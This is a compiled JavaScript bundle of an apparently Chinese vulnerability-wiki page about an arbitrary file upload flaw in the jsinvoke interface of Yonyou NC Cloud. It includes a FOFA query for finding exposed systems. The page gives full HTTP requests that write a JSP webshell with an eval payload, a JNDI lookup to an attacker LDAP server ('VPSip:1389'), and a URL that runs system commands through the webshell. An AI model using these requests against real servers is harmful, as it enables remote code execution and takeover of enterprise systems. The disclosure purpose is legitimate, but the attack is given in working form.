import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},s=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>用友 NC Cloud</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;用友-NC-Cloud&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828164153665.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /uapjs/jsinvoke/?action=invoke
Content-Type: application/json

{
    &quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,
    &quot;methodName&quot;:&quot;saveXStreamConfig&quot;,
    &quot;parameterTypes&quot;:[
        &quot;java.lang.Object&quot;,
        &quot;java.lang.String&quot;
    ], 
    &quot;parameters&quot;:[
        &quot;\${param.getClass().forName(param.error).newInstance().eval(param.cmd)}&quot;,
        &quot;webapps/nc_web/407.jsp&quot;
    ]
}
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded


{&quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,&quot;methodName&quot;:&quot;saveXStreamConfig&quot;,&quot;parameterTypes&quot;:[&quot;java.lang.Object&quot;,&quot;java.lang.String&quot;],&quot;parameters&quot;:[&quot;\${&#39;&#39;.getClass().forName(&#39;javax.naming.InitialContext&#39;).newInstance().lookup(&#39;ldap://VPSip:1389/TomcatBypass/TomcatEcho&#39;)}&quot;,&quot;webapps/nc_web/301.jsp&quot;]}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828164215853.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/cmdtest.jsp?error=bsh.Interpreter&amp;cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828164239659.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),o=[s];function d(r,l){return a(),i("div",null,o)}const v=e(t,[["render",d],["__file","用友 NC Cloud jsinvoke 任意文件上传漏洞.html.vue"]]);export{v as default};
